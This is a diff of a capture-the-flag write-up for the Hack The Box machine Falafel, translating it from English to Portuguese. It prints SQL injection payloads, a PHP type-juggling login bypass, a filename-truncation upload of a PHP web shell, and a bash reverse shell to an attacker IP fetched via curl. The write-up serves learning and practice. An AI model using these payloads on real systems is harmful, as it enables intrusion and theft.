@@ -16,29 +16,33 @@
 
 ## Nmap
 
-For enumeration, after verifying the connection, I always do a nmap scan like this:
+Na fase de enumeração, a ferramenta _nmap_ tem um lugar imprescindível!! É possível enumerar portas manualmente, com um simples _for loop_ e um _echo para o /dev/tcp/\<IP>/\<PORT>_, mas, para além do nmap ser mais controlável em termo de rendimento, tem também montes de scripts.nse que podem descobrir coisas sobre cada porta aberta.
 
 ![allPorts](Assets/HTB-Linux-Hard-Falafel/allPorts.png)
 
 ![nmap-A](Assets/HTB-Linux-Hard-Falafel/nmap-A.png)
 
-We have only ssh and 1 http port. The version of ssh have not big vulnerabilities, so the target is the port 80
+O resultado do nmap indica-nos que estamos que o nosso alvo é uma máquina Linux, com apenas as portas 22 e 80 abertas. As versões dos serviços correndo nessas portas não parecem ter vulnerabilidades críticas, por isso estamos certos que o ponto de entrada é o servidor WEB
 
 ## WebSite
 
 ![Website - First page](Assets/HTB-Linux-Hard-Falafel/website-1.png)
 
-This site give some information. We have a email (IT@falafel.htb) and with this email, we can suspect potential user (IT) and virtual hosting (falafel.htb). let add this host on /etc/hosts
+Só pela página principal, já obtemos informações potencialmente úteis. Temos um email (IT@falafel.htb) e com isso, podemos suspeitar existir um usuário (IT) e virtual hosting (falafel.htb).
 
 ```bash
+# Adicionar o host ao /etc/hosts
 echo -e "10.10.10.73\tfalafel.htb" >> /etc/hosts
 ```
 
+Apesar de ser uma suspeita plausível, não existe virtual host.
+
 ### Fuzzing the website
 
-The first fuzzing i do is for the website
+Antes de falar da página do Login (que é por aí que se vai penetrar a máquina!), irei falar sobre as rotas e potenciais ficheiros da máquina.
 
 ```bash
+# Primeira enumeração básica de rotas
 ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r
 
 #>  assets                  [Status: 403, Size: 293, Words: 22, Lines: 12]
@@ -50,9 +54,9 @@ ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-l
 #>  server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
 ```
 
-We can see and uploads directory. But nothing more... keep searching...
+Vemos um diretório **upload**. Mas por enquanto nada de mais... Temos de procurar mais...
 
-The second scan i want to do is for discovery possibles files! We have the information that is an apache with "whatweb http://falafel.htb" and the login button redirect us to a login.php. We can try to find files with php extentions. But we can add txt too
+O segundo scan que quero rodar é por ficheiros. Sabemos que é um servidor apache com auxilio do nmap, por isso podemos supor que o servidor funcione com ficheiros php. Além disso, o botão de login nós redirige para um login.php. Posto isso, o nosso próximo scan vai ser para procurar ficheiros com extenções php. Podemos também procurar por ficheiros txt...
 
 ```bash
 ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r -e .txt,.php
@@ -79,38 +83,45 @@ ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-l
 
 ```
 
-Whats is cyberlaw.txt?!
+> O que é isso de cyberlaw.txt?!
 
 ![cyberlaw.txt](Assets/HTB-Linux-Hard-Falafel/cyberlaw.png)
 
-That give us a lot of potential information...
+Bem, isto nos trás algumas informações...
 
--   Users devs and lawyers with "To: lawyers@falafel.htb, devs@falafel.htb"
--   User "chris" and confirme "admin" user
+-   Potencial users:
+	-   devs (de devs@falafel.htb)
+	-   lawyers (de lawyers@falafel.htb)
+	-   chris (do próprio texto)
+	-   admin (da "assinatura")
+
+Ainda nos diz que o usuário chris conseguiu ter FULL CONTROL do site usando um recurso de uploads de imagens, que ainda não descobrimos. Sabemos ainda que o url de upload de imagens está filtrado, por isso não deve ser assim tão fácil... Prossigamos
 
 ### SQLi
 
-After opening http://falafel.htb/ from the browser, we have a button login. if with put "admin" "admin" for user and password, we get an error "Wrong identification : admin". Another random username give us "Try again..". We can assume that the user "admin" existe.
+Quando abrimos a página http://falafel.htb/ de um browser, vemos então um botão login. Ao por credenciais por defeito do tipo _admin:admin, admin:password, test:test..._, verificamos que poderá existir um usuário admin, pois temo uma mensagem de erro que diz **"Wrong identification : admin"**. Outros usuários aleatórios nos dá a mensagem **"Try again.."**. Agora, e com a tal mensagem de cyberlaw.txt, podemos assumir que o usuário **"admin"** existe.
 
 ![admin login try](Assets/HTB-Linux-Hard-Falafel/admin-login-try.png)
 
-If we put user "' or 1=1 -- -" and password "' or 1=1 -- -", we get the same error "Wrong identification : admin". Maybe it is vulnerable to SQLi.
+Nos servidores em php, é muito commum controlarem o login e outras coisas com uma base de dados MySQL ou similar. Podemos tentar fazer o login com o clássico **"' or 1=1 -- -"** tanto no campo user como no campo password. Obtemos o mesmo erro **"Wrong identification : admin"**. Isto é um claro sinal que este campo é vulnerável a SQLi (SQL injection).
 
-If we put user "admin' and sleep(5)" and random password, we got this error "Hacking Attempt Detected!". After some try, we know what is happening. The website blocks keywords. If username or password contain the words "sleep" or "union", we got the hacking error.
+Temos mensagens distintas, mas não temos o erro SQL concreto! Por isso não é bem um blind SQLi, mas também não é assim tão claro.
 
-We can supose de username and password field exist, and can try this:
+Ao tentar por **"admin' and sleep(5)"**, temos um erro diferente: **"Hacking Attempt Detected!"**. UHUUU O FBI NOS DETECTOU LOOOL...Bem, isto parece um tipo de filtro a palavar chaves, porque ao escrever apenas e só a palavra **"sleep"** ou **"union"**, optemos o mesmo erro...
+
+Como não vemos nada, mas sabemos como são de uma maneira geral feitas as bases de dados, podemos tentar descobrir o nome da coluna. Ao escrever **admin' and substring(username,1,1)='a'-- -**, estamos a dizer que, para o usuário _admin_, queremos saber se na coluna de nome _username_, a letra positionada na 1ª posição é igual a _'a'_. E isso já nós sabemos. **_admin_** começa pela letra **_'a'_**.
 
 ```txt
 admin' and substring(username,1,1)='a'-- -
 ```
 
-That code give us the same result (Wrong identification : admin) but if we change de 'a', we got (Try again..)
+Obtemos a mesma mensagem de erro (Wrong identification : admin), e se pusermos qualquer outra letra, obtemos outro erro (Try again..) por a primeira letra não corresponder. Isso é muito bom sinal...
 
 ```txt
 admin' and substring(username,2,1)='d'-- -
 ```
 
-For de second char, if we put a 'd', we got (Wrong identification : admin) and we got (Try again..) if we put another char. if we change _"substring(username,1,1)"_ for _"substring(password,1,1)"_, we can enumerate all chars of password field with the same method. So i made a python script for discover the hash password of users "admin" and "chris" (the only 2 know valid username):
+Ao testar para o segundo caractere, obtemos o mesmo resultado, apenas optemos (Wrong identification : admin) quando acertamos na letra **_'d'_**. Mas porquê "Wrong identification : admin"? A query no código php deve estar a fazer uma comparação, entre admin e admin, e nós adicionamos 'and substring(username,1,1)='a'. Só passa para a verificação seguinte se o "admin" existir, **e se** "a sua primeira letra for 'a'". Depois de validar o campo user, fica barrado pela password, pois não a temos... Então, quando acerto na substring, vai me responder "Wrong identification". Posto isso, podemos enumerar todos os campos de todas as tabelas da base de dados desta forma. O único problema é que não temos ideia do nome dessas tabelas nem das suas colunas... Mas também não persisamos saber tudo! Basta-nos a password! Seguindo o mesmo princípio, podemos tentar com o nome de coluna password (por ser comum e normal de ser chamdo assim): **admin' and substring(password,1,1)='0...1...2...3...até...ao...z'-- -**. Manualmente, iria ser possível, mas apenas com 3 litros de café e pausas de 2 em 2 horas! Vamos automatizar isso em python:
 
 ```python
 import requests
@@ -155,54 +166,65 @@ def main():
 main()
 ```
 
-The script give us 2 hashes:
+Este script deu como resultado essas credenciais:
 
 -   chris: d4ee02a22fc872e36d9e3751ba72ddc8
 -   admin: 0e462096931906507119562988736854
 
-with online tool called crackstation.net, we got 1 password:
+Credenciais, não... São hashes, e provavelmente poderão ser crackeadas online com uma ferramenta de rambow tables crackstation.net:
 
 ![crack station](Assets/HTB-Linux-Hard-Falafel/Crackstation.png)
 
-> chris:juggling
+> Optemos um resultado ==> chris:juggling
 
 ![Login Chris](Assets/HTB-Linux-Hard-Falafel/login_chris.png)
 
-The Chris perfile have a tip. _TYPE-JUGGLING_
+Essas credenciais são válidas para a página de login! E ao entrar, deparamos-nos com a página de apredentação do chris, com um TIPS: _TYPE-JUGGLING_
 
-The admin hash is 0e462096931906507119562988736854. in php, the string "0e462096931906507119562988736854" == 0 (or "0" or every md5 hash who as "0e{numbers...}") cause php interprete that 0e{numbers...} like 0 \* (10 ^ {numbers...}) and, if the comparison is done with the loose comparisons "==" instead of the strict comparisons "===", we can bypass the password with every strings that the hash is 0e{numbers...}. On the internet, we can found a lot of md5 hashes who result in 0e{numbers...}. I will try login with "NWWKITQ"
+O hash do usuário "admin" tem uma particularidade. 0e462096931906507119562988736854. Em php, o string "0e462096931906507119562988736854" == 0 ( ou "0" == 0, ou qualquer "0e<numeros...>" == 0) porque php interpreta este 0e\<quaiqueres numeros> por **\*zero vezes 10 elevado a quaiqueres números** que efectivamente dá zero. Existe ainda em php duas formas de comparar valores.
 
-> admin:NWWKITQ (Not the real password, just juggling bypass)
+-   == - loose comparisons (compara apenas valores) ("0" == 0.0000 => true)
+-   === - strick comparisons (compara valores, e tipos de valores) ("0" == 0.0000 => false)
 
-I am in!
+Se o código php estiver a fazer uma comparação com apenas 2 iguais **"=="**, poderá aceitar toda e qualquer palavra passe cuja a sua MD5 é 0e<numeros...>
+
+Na internet, podemos encontrar muitas dessas passwords. Irei tentar com "NWWKITQ"
+
+> admin:NWWKITQ (Não é a password real, apenas deu por juggling bypass)
+
+Login efectuado com sucesso!
 
 ![logged as admin](Assets/HTB-Linux-Hard-Falafel/login_admin.png)
 
 ### RCE
 
-At this point, we can try to upload a file. The box suggests a png file.
+Encontramos o tal painel de upload que chris mencionou. Neste momento, o objectivo é enviar um reverse shell para a máquina vítima, e tentat aceder via URL para o mesmo ser executado. O primeiro passo é descobrir que tipo de ficheiro aceita. A caixa de upload indica ficheiros.png. Vou partilhar um servidor http com uma imagem.png.
 
 ```bash
 sudo python3 -m http.server 80
 ```
 
-We can update an image with png extention. but the response is very unusual. That's look the website use "wget" binary for download the file. I tried change extension, MIME type, concate a command (because the server use wget) but nothing work... The way to upload is very tricky! In linux, the maximum size of a name file is 255 chars. And wget as a function that cute the name if is very long!!
+Conseguimos realmente enviar uma imagem. E a resposa é muito incomum! A resposta parece-se muito com um commando bash, um cd para uma pasta, e um wget para o nosso ficheiro de imagem. Tentei burlar o site de diversas formas (Dupla extensão, mudar o MIME TYPE, concatenar comando com ponto e virgula, &&, ||... mas nada).
+
+A forma de enviar um ficheiro malicioso é surpreendente! O Linux não aceita nomes de arquivos que tenha mais do que 255 caracteres. E o wget está feito para limitar isso, para garantir que receba os arquivos da internet, mesmo com nomes ridiculamente enormes... Tentei então enviar um arquivo de imagem com exatamente 255 caracteres (251 + .png).
 
 ```bash
-# Copy the real image with 251 pattern char and last 4 chars as .png (255 chars)
+# Copia da imagem para um arquivo com nome de 251 caracteres seguindo um padrão para depois poder saber ao certo qual é o ponto exacto onde o wget corta o nome
 cp shell.png $(msf-pattern_create -l 251).png
 ```
 
 ![Output wget](Assets/HTB-Linux-Hard-Falafel/output_wget.png)
 
-The Output say literally the last 4 chars of the new name file is h7Ah
+Pela resposta, sabemso que foi enviado com successo, e que o nome foi alterado, tendo como fim o h7Ah.´
 
 ```bash
 msf-pattern_offset -q h7Ah
 #>  [*] Exact match at offset 232
 ```
 
-Create a new file named shell.php:
+Este "Exact match at offset 232" é feito para bufferoverflow, que normalmente seria o ponto que ficaria no ESP, sendo que não é bem esse o ponto certo. O ponto certo é 236 caracteres, mas como ainda temos de adicionar 4 caracteres para o ".png", até que dá jeito este erro lol.
+
+Cração de um ficheiro malicioso:
 
 ```php
 <?php
@@ -211,33 +233,38 @@ Create a new file named shell.php:
 ?>
 ```
 
-We know:
+Resumindo:
 
--   The file need to end with ".png" extension
--   The site will interprete php code
--   the wget of the server cut name too long and the exact offset was 232 So, we need a file with 228 char + .php + .png (for delete .png too long, and save the file pas .php)
+-   O ficheiro tem obrigatoriamente que terminar por ".png"
+-   O servidor apache interpreta código php
+-   O wget da página de upload corta os nomes muito grandes a partir do caractere 236.
+
+Posto isso, se renomearmos o nosso ficheiro malicioso por um arquivo com (232 carateres + .php + .png), o nome do arquivo irá ser cortado a partir do 236º caracter e ficará assim: (232 chars + .php)
 
 ```bash
 cp shell.php $(msf-pattern_create -l 232).php.png
+# Agora que temos o número exato de caracteres, poderíamos ter chamado o ficheiro com 232 "A"... mas na altura não me lembrei e o nome está um pouco agressivo para os olhos!
 ```
 
-In upload page, get the file and save the output...
+Resultado:
 
 > http://10.10.14.17/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png
 
 ![uploaded web shell](Assets/HTB-Linux-Hard-Falafel/good_upload.png)
 
-Note the path of the file and go to the webshell
+Note the path of the file and go to the webshell Ok, conseguimos enviar um arquivo, que aparentemente agora está na máquina alvo com a extensão .php. E onde está? Bem, no resultado o comando wget, vemos que antes de fazer o download do arquivo, fez um cd para uma pasta. E sabemos ainda que existe uma rota uploads... Ao juntar tudo, podemos tentar ir para a seguinte url(no meu caso):
 
 > http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=whoami
 
 ![whoami web shell](Assets/HTB-Linux-Hard-Falafel/whoami_web_shell.png)
 
-We Have Remote Code Execution!
+Temos Execução de código remoto!
 
 ### Reverse Shell
 
-Create a file names rev.html with the follow content:
+A forma mais fácil de ter um reverse shell sem ter muitos problemas com caracteres especiais e assim é partilhar um ficheiro com o código do reverse shell lá dentro, para depois fazer um curl e pipeá-lo com um bash (sim pipeá-lo, neste blog, este verbo existe xD)
+
+Criei então um ficheiro com o nome rev.html contendo o seguinte código:
 
 ```bash
 #!/bin/bash
@@ -245,7 +272,7 @@ Create a file names rev.html with the follow content:
 bash -i >& /dev/tcp/10.10.14.17/443 0>&1
 ```
 
-Then, share a http server and with RCE on website, curl him, and execute him
+Partilhe então um servidor http com este ficheiro, afim de através do RCE, dar um curl ao ficheiro, e pipeá-lo com bash
 
 ```bash
 sudo python3 -m http.server 80  # On one terminal
